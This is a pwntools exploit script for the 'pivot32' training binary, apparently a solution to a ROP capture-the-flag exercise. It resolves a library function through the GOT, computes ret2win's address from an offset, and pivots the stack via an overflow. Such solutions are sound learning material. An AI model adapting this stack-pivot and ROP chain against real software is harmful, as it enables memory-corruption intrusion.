#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot32')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

POP_EAX = 0x080488c0
XCHG_ESP_EAX = 0x080488c2
MOV_EAX_EAX = 0x080488c4
ADD_EAX_EBX = 0x080488c7
FOOTHOLD_GOT = exe.got["foothold_function"]

libpivot = ELF('./libpivot32.so')
FOOTHOLD_OFFSET = libpivot.sym.foothold_function
RET2WIN_OFFSET = libpivot.sym.ret2win
rop = ROP(exe)
POP_EBX = rop.find_gadget(["pop ebx", "ret"]).address
CALL_EAX = 0x080486a3

# Write rop chain that will call ret2win
line = io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:')
PIVOT_ADDR = int(line[-10:], 16)
FOOTHOLD_PLT = exe.plt["foothold_function"]
io.recvuntil('>')

# Call foothold function to resolve is address
payload = p32(FOOTHOLD_PLT)

# Put foothold@got address in eax, then move the contents of that address in eax (so the actual address of the function in the library)
payload += p32(POP_EAX)
payload += p32(FOOTHOLD_GOT)
payload += p32(MOV_EAX_EAX)

# Put the offset between ret2win and foothold in ebx, then add it in eax to calculate the correct address of ret2win
payload += p32(POP_EBX)
payload += p32(RET2WIN_OFFSET - FOOTHOLD_OFFSET)
payload += p32(ADD_EAX_EBX)

# Call ret2win (its address is in eax)
payload += p32(CALL_EAX)
io.sendline(payload)

# Stack pivot
io.recvuntil('>')
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)

payload = "A" * OFFSET
# Put address we want to move the stack at in eax, exchange it with esp
payload += p32(POP_EAX)
payload += p32(PIVOT_ADDR)
payload += p32(XCHG_ESP_EAX)
io.sendline(payload)

io.interactive()

